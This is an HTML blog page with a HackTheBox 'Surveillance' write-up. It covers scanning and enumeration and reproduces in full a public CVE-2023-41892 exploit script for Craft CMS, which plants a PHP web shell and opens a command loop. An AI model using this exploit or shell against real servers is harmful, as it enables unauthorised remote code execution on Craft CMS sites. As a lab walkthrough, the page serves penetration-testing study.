<!doctype html><html lang=en><head><title>HTB Surveillance WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="HackTheBox 'Surveillance' WriteUp"><meta name=keywords content="blog,pentesting,hacking,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB Surveillance WriteUp"><meta name=twitter:description content="HackTheBox 'Surveillance' WriteUp"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/posts/surveillance/"><meta property="og:site_name" content="gunzf0x"><meta property="og:title" content="HTB Surveillance WriteUp"><meta property="og:description" content="HackTheBox 'Surveillance' WriteUp"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-04-20T00:00:00+00:00"><meta property="article:modified_time" content="2024-04-20T00:00:00+00:00"><meta property="article:tag" content="HTB"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Crackstation"><meta property="article:tag" content="Pivoting"><meta property="article:tag" content="Burpsuite"><link rel=canonical href=https://gunzf0x.github.io/pentesting/posts/surveillance/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.064032bdabf71803ac209bfac7afe4609898265440caa172acba739538eb4845.css integrity="sha256-BkAyvav3GAOsIJv6x6/kYJiYJlRAyqFyrLpzlTjrSEU=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/projects/>Projects</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/contact/>Contact me</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/es/posts/surveillance/>üá®üá±</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/posts/surveillance/>HTB Surveillance WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-04-20T00:00:00Z>20 April, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
18-minute read</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/tags/htb/>HTB</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/linux/>Linux</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/crackstation/>Crackstation</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/pivoting/>Pivoting</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/burpsuite/>Burpsuite</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/powershell/>Powershell</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/craft-cms/>Craft Cms</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/password-cracking/>Password Cracking</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/zoneminder/>Zoneminder</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/netexec/>Netexec</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/crackmapexec/>Crackmapexec</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/netcat/>Netcat</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/medium/>Medium</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/local-port-forwarding/>Local Port Forwarding</a></span></div></div></header><div class=post-content><hr><h1 id=surveillance----hackthebox>Surveillance &ndash; HackTheBox
<a class=heading-link href=#surveillance----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Linux</em></li><li>Difficulty: <em>Medium</em></li><li>Platform: <em>HackTheBox</em></li></ul><p><img alt="&lsquo;Surveillance&rsquo; Avatar" src=/pentesting/images/Surveillance_avatar.png></p><hr><h2 id=user>User
<a class=heading-link href=#user><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li><code>Nmap</code> scan shows only 2 ports open: <code>22</code> <code>SSH</code> and <code>80</code> <code>HTTP</code></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p22,80 10.10.11.245 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-18 17:52 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.245
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.31s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT   STATE SERVICE VERSION
</span></span></span><span class=line><span class=cl><span class=go>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
</span></span></span><span class=line><span class=cl><span class=go>| ssh-hostkey:
</span></span></span><span class=line><span class=cl><span class=go>|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
</span></span></span><span class=line><span class=cl><span class=go>|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
</span></span></span><span class=line><span class=cl><span class=go>80/tcp open  http    nginx 1.18.0 (Ubuntu)
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: nginx/1.18.0 (Ubuntu)
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Did not follow redirect to http://surveillance.htb/
</span></span></span><span class=line><span class=cl><span class=go>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 16.95 seconds
</span></span></span></code></pre></div><ul><li>If we try to visit <code>HTTP</code> server running on port <code>80</code> at <code>http://10.10.11.245</code> I got redirected to <code>http://surveillance.htb</code>. For this reason we simply add <code>surveillance.htb</code> to our <code>/etc/hosts</code> file running:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo echo &#39;10.10.11.245 surveillance.htb&#39; &gt;&gt; /etc/hosts
</span></span></span></code></pre></div><ul><li>Once added that domain to our <code>/etc/hosts</code> file, if we revisit <code>http://surveillance.htb</code> we can see the page:
<img alt=Surveillance_1.png src=/pentesting/images/Surveillance_1.png>
Many of the buttons in this page does not simply work, so I suspect that there is nothing to find here.</li><li>I note that if I visit <code>/index.php</code> it shows the default site, so I assume it is running using <code>PHP</code>. If I attempt a <code>Brute Force Directory Listing</code> using <code>Gobuster</code>, searching also for <code>.php</code> files, I find some directories:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://surveillance.htb -t 55 -x php
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Gobuster v3.6
</span></span></span><span class=line><span class=cl><span class=go>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>[+] Url:                     http://surveillance.htb
</span></span></span><span class=line><span class=cl><span class=go>[+] Method:                  GET
</span></span></span><span class=line><span class=cl><span class=go>[+] Threads:                 55
</span></span></span><span class=line><span class=cl><span class=go>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span></span><span class=line><span class=cl><span class=go>[+] Negative Status codes:   404
</span></span></span><span class=line><span class=cl><span class=go>[+] User Agent:              gobuster/3.6
</span></span></span><span class=line><span class=cl><span class=go>[+] Extensions:              php
</span></span></span><span class=line><span class=cl><span class=go>[+] Timeout:                 10s
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Starting gobuster in directory enumeration mode
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>/img                  (Status: 301) [Size: 178] [--&gt; http://surveillance.htb/img/]
</span></span></span><span class=line><span class=cl><span class=go>/images               (Status: 301) [Size: 178] [--&gt; http://surveillance.htb/images/]
</span></span></span><span class=line><span class=cl><span class=go>/index                (Status: 200) [Size: 1]
</span></span></span><span class=line><span class=cl><span class=go>/index.php            (Status: 200) [Size: 16230]
</span></span></span><span class=line><span class=cl><span class=go>/admin                (Status: 302) [Size: 0] [--&gt; http://surveillance.htb/admin/login]
</span></span></span><span class=line><span class=cl><span class=go>/css                  (Status: 301) [Size: 178] [--&gt; http://surveillance.htb/css/]
</span></span></span><span class=line><span class=cl><span class=go>/js                   (Status: 301) [Size: 178] [--&gt; http://surveillance.htb/js/]
</span></span></span><span class=line><span class=cl><span class=go>/logout               (Status: 302) [Size: 0] [--&gt; http://surveillance.htb/]
</span></span></span><span class=line><span class=cl><span class=go>/p1                   (Status: 200) [Size: 16230]
</span></span></span><span class=line><span class=cl><span class=go>/fonts                (Status: 301) [Size: 178] [--&gt; http://surveillance.htb/fonts/]
</span></span></span><span class=line><span class=cl><span class=go>/p3                   (Status: 200) [Size: 16230]
</span></span></span><span class=line><span class=cl><span class=go>/p2                   (Status: 200) [Size: 16230]
</span></span></span></code></pre></div><p>and I find an interesting directory: <code>/admin</code> redirects to <code>/admin/login</code> directory. There is a bunch of directories called <code>p&lt;number></code> like <code>p1</code>, <code>p20</code> and so on&mldr; but they all redirect to <code>index.php</code>, so I discard them.</p><ul><li><p>I visit <code>http://surveillance.htb/admin/login</code> and it shows a login panel:
<img alt=Surveillance_2.png src=/pentesting/images/Surveillance_2.png></p><p>So it says it is running <code>Craft CMS</code>, a <code>Content Management System</code> &ndash;or <code>CMS</code>&ndash; (like it would be, for example, <code>WordPress</code>).</p></li><li><p>If I search for exploits for this <code>CMS</code> using <code>SearchSploit</code> I can find some:</p></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ searchsploit craft cms
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>--------------------------------------------------- ---------------------------------
</span></span></span><span class=line><span class=cl><span class=go> Exploit Title                                     |  Path
</span></span></span><span class=line><span class=cl><span class=go>--------------------------------------------------- ---------------------------------
</span></span></span><span class=line><span class=cl><span class=go>Craft CMS 2.6 - Cross-Site Scripting               | php/webapps/42143.txt
</span></span></span><span class=line><span class=cl><span class=go>Craft CMS 2.7.9/3.2.5 - Information Disclosure     | php/webapps/47343.txt
</span></span></span><span class=line><span class=cl><span class=go>Craft CMS 3.0.25 - Cross-Site Scripting            | php/webapps/46054.txt
</span></span></span><span class=line><span class=cl><span class=go>Craft CMS 3.1.12 Pro - Cross-Site Scripting        | php/webapps/46496.txt
</span></span></span><span class=line><span class=cl><span class=go>Craft CMS SEOmatic plugin 3.1.4 - Server-Side Temp | linux/webapps/45108.txt
</span></span></span><span class=line><span class=cl><span class=go>CraftCMS 3 vCard Plugin 1.0.0 - Remote Code Execut | php/webapps/48492.py
</span></span></span><span class=line><span class=cl><span class=go>craftercms 4.x.x - CORS                            | multiple/webapps/51313.txt
</span></span></span><span class=line><span class=cl><span class=go>--------------------------------------------------- ---------------------------------
</span></span></span><span class=line><span class=cl><span class=go>Shellcodes: No Results
</span></span></span></code></pre></div><p>However, I still do not have the version</p><ul><li>If I look the source code of <code>http://surveillance.htb</code> I can see something:
<img alt=Surveillance_3.png src=/pentesting/images/Surveillance_3.png>
so I assume the version of <code>Craft CMS</code> running is <code>4.4.14</code>, which sadly do not match with any version shown by <code>SearchSploit</code> exploits.</li><li>But if I just Google <code>Craft CMS 4.4 exploit</code> I find that there is a vulnerability labeled as <code>CVE-2023-41892</code>. I also find two interesting sites. One is an exploit from <code>exploit-db</code> (<a href=https://www.exploit-db.com/exploits/51918 class=external-link target=_blank rel=noopener>https://www.exploit-db.com/exploits/51918</a>) and the other is from <a href=https://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce class=external-link target=_blank rel=noopener>this Github post</a>. I will use the last one, which is:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>headers</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;User-Agent&#34;</span><span class=p>:</span> <span class=s2>&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>writePayloadToTempFile</span><span class=p>(</span><span class=n>documentRoot</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;action&#34;</span><span class=p>:</span> <span class=s2>&#34;conditions/render&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;configObject[class]&#34;</span><span class=p>:</span> <span class=s2>&#34;craft\elements\conditions\ElementCondition&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;config&#34;</span><span class=p>:</span> <span class=s1>&#39;{&#34;name&#34;:&#34;configObject&#34;,&#34;as &#34;:{&#34;class&#34;:&#34;Imagick&#34;, &#34;__construct()&#34;:{&#34;files&#34;:&#34;msl:/etc/passwd&#34;}}}&#39;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>files</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;image1&#34;</span><span class=p>:</span> <span class=p>(</span><span class=s2>&#34;pwn1.msl&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;&#34;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
</span></span></span><span class=line><span class=cl><span class=s2>        &lt;image&gt;
</span></span></span><span class=line><span class=cl><span class=s2>        &lt;read filename=&#34;caption:&amp;lt;?php @system(@$_REQUEST[&#39;cmd&#39;]); ?&amp;gt;&#34;/&gt;
</span></span></span><span class=line><span class=cl><span class=s2>        &lt;write filename=&#34;info:DOCUMENTROOT/shell.php&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=s2>        &lt;/image&gt;&#34;&#34;&#34;</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;DOCUMENTROOT&#34;</span><span class=p>,</span> <span class=n>documentRoot</span><span class=p>),</span> <span class=s2>&#34;text/plain&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>files</span><span class=o>=</span><span class=n>files</span><span class=p>,</span> <span class=n>proxies</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;http&#34;</span><span class=p>:</span> <span class=s2>&#34;http://localhost:8080&#34;</span><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>getTmpUploadDirAndDocumentRoot</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;action&#34;</span><span class=p>:</span> <span class=s2>&#34;conditions/render&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;configObject[class]&#34;</span><span class=p>:</span> <span class=s2>&#34;craft\elements\conditions\ElementCondition&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;config&#34;</span><span class=p>:</span> <span class=sa>r</span><span class=s1>&#39;{&#34;name&#34;:&#34;configObject&#34;,&#34;as &#34;:{&#34;class&#34;:&#34;</span><span class=se>\\</span><span class=s1>GuzzleHttp</span><span class=se>\\</span><span class=s1>Psr7</span><span class=se>\\</span><span class=s1>FnStream&#34;, &#34;__construct()&#34;:{&#34;methods&#34;:{&#34;close&#34;:&#34;phpinfo&#34;}}}}&#39;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>pattern1</span> <span class=o>=</span> <span class=sa>r</span><span class=s1>&#39;&lt;tr&gt;&lt;td class=&#34;e&#34;&gt;upload_tmp_dir&lt;\/td&gt;&lt;td class=&#34;v&#34;&gt;(.*?)&lt;\/td&gt;&lt;td class=&#34;v&#34;&gt;(.*?)&lt;\/td&gt;&lt;\/tr&gt;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>pattern2</span> <span class=o>=</span> <span class=sa>r</span><span class=s1>&#39;&lt;tr&gt;&lt;td class=&#34;e&#34;&gt;\$_SERVER\[</span><span class=se>\&#39;</span><span class=s1>DOCUMENT_ROOT</span><span class=se>\&#39;</span><span class=s1>\]&lt;\/td&gt;&lt;td class=&#34;v&#34;&gt;([^&lt;]+)&lt;\/td&gt;&lt;\/tr&gt;&#39;</span>
</span></span><span class=line><span class=cl>   
</span></span><span class=line><span class=cl>    <span class=n>match1</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>pattern1</span><span class=p>,</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>,</span> <span class=n>re</span><span class=o>.</span><span class=n>DOTALL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>match2</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>pattern2</span><span class=p>,</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>,</span> <span class=n>re</span><span class=o>.</span><span class=n>DOTALL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>match1</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>),</span> <span class=n>match2</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>trigerImagick</span><span class=p>(</span><span class=n>tmpDir</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;action&#34;</span><span class=p>:</span> <span class=s2>&#34;conditions/render&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;configObject[class]&#34;</span><span class=p>:</span> <span class=s2>&#34;craft\elements\conditions\ElementCondition&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;config&#34;</span><span class=p>:</span> <span class=s1>&#39;{&#34;name&#34;:&#34;configObject&#34;,&#34;as &#34;:{&#34;class&#34;:&#34;Imagick&#34;, &#34;__construct()&#34;:{&#34;files&#34;:&#34;vid:msl:&#39;</span> <span class=o>+</span> <span class=n>tmpDir</span> <span class=o>+</span> <span class=sa>r</span><span class=s1>&#39;/php*&#34;}}}&#39;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>,</span> <span class=n>proxies</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;http&#34;</span><span class=p>:</span> <span class=s2>&#34;http://127.0.0.1:8080&#34;</span><span class=p>})</span>    
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>shell</span><span class=p>(</span><span class=n>cmd</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span> <span class=o>+</span> <span class=s2>&#34;/shell.php&#34;</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;cmd&#34;</span><span class=p>:</span> <span class=n>cmd</span><span class=p>})</span>
</span></span><span class=line><span class=cl>    <span class=k>match</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;caption:(.*?)CAPTION&#39;</span><span class=p>,</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>,</span> <span class=n>re</span><span class=o>.</span><span class=n>DOTALL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=k>match</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>extracted_text</span> <span class=o>=</span> <span class=k>match</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>extracted_text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>extracted_text</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Usage: python CVE-2023-41892.py &lt;url&gt;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>url</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Get temporary folder and document root ...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>upload_tmp_dir</span><span class=p>,</span> <span class=n>documentRoot</span> <span class=o>=</span> <span class=n>getTmpUploadDirAndDocumentRoot</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>tmpDir</span> <span class=o>=</span> <span class=s2>&#34;/tmp&#34;</span> <span class=k>if</span> <span class=n>upload_tmp_dir</span> <span class=o>==</span> <span class=s2>&#34;no value&#34;</span> <span class=k>else</span> <span class=n>upload_tmp_dir</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Write payload to temporary file ...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>writePayloadToTempFile</span><span class=p>(</span><span class=n>documentRoot</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=n>requests</span><span class=o>.</span><span class=n>exceptions</span><span class=o>.</span><span class=n>ConnectionError</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Crash the php process and write temp file successfully&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Trigger imagick to write shell ...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>trigerImagick</span><span class=p>(</span><span class=n>tmpDir</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Done, enjoy the shell&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>cmd</span> <span class=o>=</span> <span class=nb>input</span><span class=p>(</span><span class=s2>&#34;$ &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>shell</span><span class=p>(</span><span class=n>cmd</span><span class=p>)</span>
</span></span></code></pre></div><ul><li>If I run the script nothing happens:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 CVE_2023_41892.py http://surveillance.htb/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[-] Get temporary folder and document root ...
</span></span></span><span class=line><span class=cl><span class=go>[-] Write payload to temporary file ...
</span></span></span><span class=line><span class=cl><span class=go>[-] Crash the php process and write temp file successfully
</span></span></span><span class=line><span class=cl><span class=go>[-] Trigger imagick to write shell ...
</span></span></span><span class=line><span class=cl><span class=go>[-] Done, enjoy the shell
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>$</span> id
</span></span><span class=line><span class=cl><span class=gp>$</span> whoami
